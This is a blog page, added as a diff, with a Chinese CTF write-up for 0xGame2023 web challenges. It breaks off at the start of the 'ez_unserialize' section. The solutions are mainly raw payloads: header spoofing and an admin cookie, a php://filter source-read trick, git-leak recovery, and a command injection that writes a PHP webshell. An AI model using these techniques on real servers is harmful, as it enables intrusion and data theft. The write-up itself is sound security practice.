@@ -1,0 +1,1192 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>0xGame2023 wp | 甜筒园</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="0xGame2023 wp | 甜筒园">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="CITS1003 CTF[TOC] Emu Hack #1 - Backdoored根据题目描述，在端口61000到61500之间存在一个后门，使用nmap工具进行端口扫描: nmap 34.116.68.59 -p 61000-61550   发现在端口61337存在TCP服务，按照题目要求使用nc连接后发送EMU拿到flag nc 34.116.68.59 61337 EMU   Caffei">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CITS1003 CTF wp">
+<meta property="og:url" content="https://www.ttycp3.top/archives/f8a3bab8.html">
+<meta property="og:site_name" content="甜筒园">
+<meta property="og:description" content="CITS1003 CTF[TOC] Emu Hack #1 - Backdoored根据题目描述，在端口61000到61500之间存在一个后门，使用nmap工具进行端口扫描: nmap 34.116.68.59 -p 61000-61550   发现在端口61337存在TCP服务，按照题目要求使用nc连接后发送EMU拿到flag nc 34.116.68.59 61337 EMU   Caffei">
+<meta property="og:locale">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427185925654.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427190418683.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427194602383.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427194758409.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427195103342.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427200212033.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427200237861.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205355895.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205446268.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205546918.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205715007.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205814892.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205854735.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427210020443.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427210136578.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427215222685.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427230728660.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427230941388.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427232027952.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428085406716.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428085508241.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428084447502.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428143720534.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428103936811.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428104023953.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428104245922.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428142339778.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428142823544.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514145356203.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514145439171.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514151957982.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514152042484.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514171059762.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514173309181.png">
+<meta property="article:published_time" content="2024-05-09T08:21:59.504Z">
+<meta property="article:modified_time" content="2024-05-14T09:33:11.466Z">
+<meta property="article:author" content="ttycp3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427185925654.png">
+
+
+<link rel="icon" href="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/logo.png">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/gruvbox-dark.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+    <script>        (function(){            var bp = document.createElement('script');            var curProtocol = window.location.protocol.split(':')[0];            if (curProtocol === 'https') {                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';                    }            else {                bp.src = 'http://push.zhanzhang.baidu.com/push.js';            }            var s = document.getElementsByTagName("script")[0];            s.parentNode.insertBefore(bp, s);        })();    </script>  
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="http://q.qlogo.cn/headimg_dl?dst_uin=1004454362&amp;spec=640&amp;img_type=jpg"/>
+</a>
+<div class="author">
+    <span>ttycp3</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="github"
+               href="https://github.com/ttycp3"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="csdn"
+               href="https://blog.csdn.net/qq_33814823"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-csdn"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="neteasemusic"
+               href="https://music.163.com/#/user/home?id=1765543783"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-neteasemusic"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(32)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                <li>
+                    <div data-rel="Writeup">
+                        
+                        Writeup
+                        <small>(25)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="笔记">
+                        
+                        笔记
+                        <small>(4)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="工具">
+                        
+                        工具
+                        <small>(1)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="算法竞赛专题">
+                        
+                        算法竞赛专题
+                        <small>(2)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="32">
+<input type="hidden" id="yelog_site_word_count" value="40.6k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>流量分析</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>命令执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>任意文件读取</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>杂项</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>CRLF Injection</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>gopher协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>grafana</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>JAVA安全</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>jwt伪造</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>pickle反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>session反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssrf漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XPath注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xxe漏洞</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="All Writeup "
+           href="/archives/f8a3bab8.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CITS1003 CTF wp">CITS1003 CTF wp</span>
+            <span class="post-date" title="2024-05-09 16:21:59">2024/05/09</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/e228e2bf.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="XYCTF2024">XYCTF2024</span>
+            <span class="post-date" title="2024-04-28 14:40:53">2024/04/28</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/53f30b58.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NCTF2023web（赛后复现）">NCTF2023web（赛后复现）</span>
+            <span class="post-date" title="2023-12-31 16:31:14">2023/12/31</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/3b79de97.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="SHCTF wp">SHCTF wp</span>
+            <span class="post-date" title="2023-10-02 13:25:28">2023/10/02</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/d4f5203b.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="0xGame2023 wp">0xGame2023 wp</span>
+            <span class="post-date" title="2023-10-01 14:16:22">2023/10/01</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/83697f53.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Moectf2023">Moectf2023</span>
+            <span class="post-date" title="2023-09-16 11:44:15">2023/09/16</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/7a95ce38.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="SYCTF2023wp">SYCTF2023wp</span>
+            <span class="post-date" title="2023-06-10 12:48:24">2023/06/10</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/1d622977.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="第16届ciscn初赛wp">第16届ciscn初赛wp</span>
+            <span class="post-date" title="2023-05-28 18:51:15">2023/05/28</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/7dc07b0.html"
+           data-tag="流量分析,杂项"
+           data-author="" >
+            <span class="post-title" title="第四届闽盾杯Misc流量分析">第四届闽盾杯Misc流量分析</span>
+            <span class="post-date" title="2023-05-25 14:23:16">2023/05/25</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/4524613a.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="ångstromCTF 2023">ångstromCTF 2023</span>
+            <span class="post-date" title="2023-04-25 15:17:57">2023/04/25</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/37321197.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="HDCTF2023">HDCTF2023</span>
+            <span class="post-date" title="2023-04-24 16:30:04">2023/04/24</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/3527c39a.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="第三届红明谷杯">第三届红明谷杯</span>
+            <span class="post-date" title="2023-04-19 14:18:45">2023/04/19</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/6ee431f.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="GDOUCTF2023">GDOUCTF2023</span>
+            <span class="post-date" title="2023-04-16 12:42:03">2023/04/16</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/e92ae896.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="HackPack CTF 2023">HackPack CTF 2023</span>
+            <span class="post-date" title="2023-04-15 16:32:49">2023/04/15</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/c603889a.html"
+           data-tag="pickle反序列化,jwt伪造"
+           data-author="" >
+            <span class="post-title" title="CISCN2019 华北赛区 Day1 ikun">CISCN2019 华北赛区 Day1 ikun</span>
+            <span class="post-date" title="2023-04-12 15:17:10">2023/04/12</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/b85a28bc.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTFSHOW第三届愚人杯部分WP">CTFSHOW第三届愚人杯部分WP</span>
+            <span class="post-date" title="2023-04-02 19:28:10">2023/04/02</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/fcef946.html"
+           data-tag="文件上传,任意文件读取,JAVA安全"
+           data-author="" >
+            <span class="post-title" title="GKCTF2021 babycat">GKCTF2021 babycat</span>
+            <span class="post-date" title="2023-04-01 19:45:19">2023/04/01</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/56a79676.html"
+           data-tag="ssrf漏洞"
+           data-author="" >
+            <span class="post-title" title="GYCTF2020 Node Game">GYCTF2020 Node Game</span>
+            <span class="post-date" title="2023-03-21 16:21:32">2023/03/21</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/f06c7905.html"
+           data-tag="ssrf漏洞,gopher协议"
+           data-author="" >
+            <span class="post-title" title="2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl">2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl</span>
+            <span class="post-date" title="2023-03-15 17:45:23">2023/03/15</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/2e3a56ed.html"
+           data-tag="xxe漏洞"
+           data-author="" >
+            <span class="post-title" title="GoogleCTF2019 Quals Bnv">GoogleCTF2019 Quals Bnv</span>
+            <span class="post-date" title="2023-03-15 17:45:23">2023/03/15</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/32149828.html"
+           data-tag="ssrf漏洞,session反序列化,CRLF Injection"
+           data-author="" >
+            <span class="post-title" title="bestphp&#39;s revenge">bestphp&#39;s revenge</span>
+            <span class="post-date" title="2023-03-14 19:17:23">2023/03/14</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/54488cb7.html"
+           data-tag="XPath注入"
+           data-author="" >
+            <span class="post-title" title="Xpath笔记">Xpath笔记</span>
+            <span class="post-date" title="2023-03-11 21:17:23">2023/03/11</span>
+        </a>
+        
+        
+        <a  class="All 算法竞赛专题 "
+           href="/archives/68b41866.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="常用简单模板">常用简单模板</span>
+            <span class="post-date" title="2022-10-23 12:17:23">2022/10/23</span>
+        </a>
+        
+        
+        <a  class="All 算法竞赛专题 "
+           href="/archives/2bd6ac.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="从c升级到c++速成">从c升级到c++速成</span>
+            <span class="post-date" title="2022-10-20 13:47:23">2022/10/20</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/66731dbe.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NEWSTARCTF2022-Web">NEWSTARCTF2022-Web</span>
+            <span class="post-date" title="2022-10-06 23:53:26">2022/10/06</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/ac4562c6.html"
+           data-tag="命令执行"
+           data-author="" >
+            <span class="post-title" title="ctfshow七夕杯wp">ctfshow七夕杯wp</span>
+            <span class="post-date" title="2022-08-06 17:17:23">2022/08/06</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/ec3e2815.html"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="Webshell笔记">Webshell笔记</span>
+            <span class="post-date" title="2022-05-13 21:17:23">2022/05/13</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/e9530a94.html"
+           data-tag="grafana"
+           data-author="" >
+            <span class="post-title" title="STARCTF2022 oh-my-grafana">STARCTF2022 oh-my-grafana</span>
+            <span class="post-date" title="2022-04-16 23:53:26">2022/04/16</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/1a0e10db.html"
+           data-tag="ssrf漏洞"
+           data-author="" >
+            <span class="post-title" title="SSRF笔记">SSRF笔记</span>
+            <span class="post-date" title="2022-03-30 21:47:23">2022/03/30</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/a00344c6.html"
+           data-tag="sql注入"
+           data-author="" >
+            <span class="post-title" title="SQL注入笔记">SQL注入笔记</span>
+            <span class="post-date" title="2022-03-24 20:17:23">2022/03/24</span>
+        </a>
+        
+        
+        <a  class="All 工具 "
+           href="/archives/7450bfcb.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="实用工具">实用工具</span>
+            <span class="post-date" title="2022-01-24 18:17:23">2022/01/24</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/bff3fd5a.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="攻防世界web新手区Writeup">攻防世界web新手区Writeup</span>
+            <span class="post-date" title="2022-01-16 18:17:23">2022/01/16</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-0xGame2023-wp" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">0xGame2023 wp</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Writeup">Writeup</a>
+            
+        </span>
+        
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2023-10-08 11:25:00'>2023-10-01 14:16</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:978</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-signin"><span class="toc-text">[Week 1] signin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-hello-http"><span class="toc-text">[Week 1] hello_http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-baby-php"><span class="toc-text">[Week 1] baby_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-repo-leak"><span class="toc-text">[Week 1] repo_leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-ping"><span class="toc-text">[Week 1] ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-2-ez-unserialize"><span class="toc-text">[Week 2] ez_unserialize</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-signin"><span class="toc-text">[Week 1] signin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-hello-http"><span class="toc-text">[Week 1] hello_http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-baby-php"><span class="toc-text">[Week 1] baby_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-repo-leak"><span class="toc-text">[Week 1] repo_leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-1-ping"><span class="toc-text">[Week 1] ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Week-2-ez-unserialize"><span class="toc-text">[Week 2] ez_unserialize</span></a></li></ol></li></ol></div></p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h3><p>页面审查元素发现有个<code>js</code>文件，末尾有一行注释：</p>
+<pre><code class="./assets/index-33309f51.js">//# sourceMappingURL=index-33309f51.js.map
+</code></pre>
+<p>访问后下载打开，<code>Ctrl+F</code>查找字符串<code>0xGame</code>匹配到flag</p>
+<pre><code>0xGame&#123;c788fa80-2184-429f-b410-48cb8e2de0ff&#125;
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20231001142350507.png" alt="image-20231001142350507"></p>
+<h3 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="[Week 1] hello_http"></a>[Week 1] hello_http</h3><p>典之又典</p>
+<pre><code>POST /?query=ctf HTTP/1.1
+Referer: ys.mihoyo.com
+User-Agent: HarmonyOS Browser
+X-Forwarded-For: 127.0.0.1
+Origin: http://120.27.148.152:50012
+Dnt: 1
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://120.27.148.152:50012/?query=ctf
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cookie: role=admin
+
+action=getflag
+</code></pre>
+<p>发包后拿到flag</p>
+<pre><code>0xGame&#123;2c1a10fb-921e-4250-820f-5ce36940b8b5&#125;
+</code></pre>
+<h3 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h3><p>理解就能秒</p>
+<pre><code>POST /?a[]=1&amp;b[]=2 HTTP/1.1
+Dnt: 1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Cookie: name=php://filter/convert.base64-encode/resource=flag
+
+c=1024.1ff
+</code></pre>
+<p>拿到字符串去base64解码</p>
+<pre><code>0xGame&#123;43bb3e24-0824-48cb-95d0-c471540c0953&#125;
+</code></pre>
+<h3 id="Week-1-repo-leak"><a href="#Week-1-repo-leak" class="headerlink" title="[Week 1] repo_leak"></a>[Week 1] repo_leak</h3><p>考点写的非常明确是git泄露，但对工具的需求有点坑人，我拿平常用的<code>GitHack-master</code>跑不出来，换了个<code>GitHacker</code>才成功跑出来。下面是完整命令：</p>
+<pre><code>#安装
+python3 -m pip install -i https://pypi.org/simple/ GitHacker
+#运行
+githacker --url http://120.27.148.152:50013/.git/ --output-folder result
+#进入目录后查看历史版本
+git log --reflog
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20231005170050253.png" alt="image-20231005170050253"></p>
+<pre><code>#切换版本为flag那个
+git reset --hard 8a5b670558921bd232d75b29542492f00698298b
+#在当前目录匹配包含flag的文件
+grep -r  &quot;flag&quot; ./
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20231005170247956.png" alt="image-20231005170247956"></p>
+<p>拿出来url解码一下拿到flag</p>
+<pre><code>0xGame&#123;3fc49725-23b5-4f28-8c64-16a3459b67b7&#125;
+</code></pre>
+<h3 id="Week-1-ping"><a href="#Week-1-ping" class="headerlink" title="[Week 1] ping"></a>[Week 1] ping</h3><p>ctrl+u拿到提示查看api.php源码</p>
+<pre><code class="php">&lt;?php
+
+function sanitize($s) &#123;
+    $s = str_replace(&#39;;&#39;, &#39;&#39;, $s);
+    $s = str_replace(&#39; &#39;, &#39;&#39;, $s);
+    $s = str_replace(&#39;/&#39;, &#39;&#39;, $s);
+    $s = str_replace(&#39;flag&#39;, &#39;&#39;, $s);
+    return $s;
+&#125;
+
+if (isset($_GET[&#39;source&#39;])) &#123;
+    highlight_file(__FILE__);
+    die();
+&#125;
+
+if (!isset($_POST[&#39;ip&#39;])) &#123;
+    die(&#39;No IP Address&#39;);
+&#125;
+
+$ip = $_POST[&#39;ip&#39;];
+
+$ip = sanitize($ip);
+
+if (!preg_match(&#39;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#39;, $ip)) &#123;
+    die(&#39;Invalid IP Address&#39;);
+&#125;
+
+system(&#39;ping -c 4 &#39;.$ip. &#39; 2&gt;&amp;1&#39;);
+
+?&gt;
+</code></pre>
+<p>利用管道符进行多命令执行，写文件到当前目录：</p>
+<pre><code>POST /api.php
+
+ip=127.0.0.1|echo$&#123;IFS&#125;&quot;PD9waHAgc3lzdGVtKCdjYXQgL2YqJyk7&quot;|base64$&#123;IFS&#125;-d$&#123;IFS&#125;&gt;1.php
+</code></pre>
+<p>访问1.php拿到flag</p>
+<pre><code>0xGame&#123;19c71976-d7d8-4ab8-9ea5-6ea3800f59f6&#125;
+</code></pre>
+<h3 id="Week-2-ez-unserialize"><a href="#Week-2-ez-unserialize" class="headerlink" title="[Week 2] ez_unserialize"></a>[Week 2] ez_unserialize</h3><pre><code>&lt;?php
+
+show_source(__FILE__);
+
+class Cache &#123;
+    public $key;
